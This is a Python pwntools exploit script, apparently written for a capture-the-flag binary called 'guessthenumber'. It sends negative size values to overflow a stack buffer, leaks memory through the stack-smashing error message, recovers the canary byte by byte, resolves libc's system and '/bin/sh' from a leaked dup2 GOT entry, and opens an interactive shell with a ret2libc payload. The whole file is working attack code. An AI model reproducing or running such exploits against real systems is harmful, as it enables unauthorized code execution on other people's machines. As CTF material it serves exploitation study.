from pwn import *
import sys
#context.log_level = "DEBUG"

host = sys.argv[1]
port = int(sys.argv[2])

def addStack(rl):
    payload = "ciaociao"
    rl.recvuntil("Exit\n")
    rl.sendline("1")
    rl.recvuntil("name?\n")
    rl.sendline("-5000")
    rl.recvuntil("name:\n")
    rl.send(payload)
    rl.recvuntil("etry\n")
    rl.sendline("c")

def leak(addr):
    payload = cyclic(436) + p32(addr)
    rl = remote(host,port)
    
    addStack(rl)

    rl.recvuntil("Exit\n")
    rl.sendline("1")
    rl.recvuntil("name?\n")
    rl.sendline("-100")
    rl.recvuntil("name:\n")
    rl.send(payload)
    rl.recvuntil("etry\n")
    rl.sendline("c")
    leaked = ""
    try:
        rl.recvuntil("*** stack smashing detected ***: ")
        leaked = rl.recvuntil(" terminated")[:-11]
    except Exception as e:
        print str(e)
    finally:
        rl.close()
    leaked += "\x00"
    return leaked

def leakpuro(addr):
    payload = cyclic(436) + p32(addr)
    rl = remote(host,port)
    rl.recvuntil("Exit\n")
    rl.sendline("1")
    rl.recvuntil("name?\n")
    rl.sendline("-100")
    rl.recvuntil("name:\n")
    rl.send(payload)
    rl.recvuntil("etry\n")
    rl.sendline("c")
    leaked = ""
    try:
        rl.recvuntil("*** stack smashing detected ***: ")
        leaked = rl.recvuntil(" terminated")[:-11]
    except Exception as e:
        print str(e)
    finally:
        rl.close()
    leaked += "\x00"
    return leaked

def overflow(size,payload):
    rl = remote(host,port)
    rl.recvuntil("Exit\n")
    rl.sendline("1")
    rl.recvuntil("name?\n")
    rl.sendline(size)
    rl.recvuntil("name:\n")
    rl.send(payload)
    rl.recvuntil("etry\n")
    rl.sendline("c")
    return rl

elf = ELF("guessthenumber")
to_leak = elf.symbols["name"]
stack = u32(leakpuro(to_leak)[0:4])
log.info("stack at "+hex(stack))
maybe_canary = stack - 0x1344 #offset of the old canary remained in the stack with the alloca(5000) 
log.info("canary address = "+hex(maybe_canary))
canary = leak(maybe_canary)
log.info("canary tutto assieme "+canary)
a = "" 
for i in range(0,4):
    a += leak(maybe_canary+i)[0]

assert(len(a)==4)

canary = u32(a)
log.info("canary one byte at time = "+hex(canary))

#need to find system
dup2_got = elf.got["dup2"]
dup2_runtime = u32(leakpuro(dup2_got)[0:4])
libc = ELF("./libc.so.6")
offset_system = libc.symbols["dup2"]-libc.symbols["system"]
system_runtime = dup2_runtime - offset_system
offset_bin = libc.symbols["dup2"] - next(libc.search("/bin/sh"))
bin_runtime = dup2_runtime - offset_bin
log.info("system at "+hex(system_runtime))
#buffer_ptr@(-100) - canary_addr = 156
#ret_addr - canary_addr = 16
#sending a -100 size
#payload  = 156*"A"
#payload += canary
#payload += 12*"B"
#payload += ropchain!

payload  = 156*"A"
payload += p32(canary)
payload += 12*"B"
payload += p32(system_runtime)
payload += 4*"C"
payload += p32(bin_runtime)
size = "-100"
overflow(size,payload).interactive()

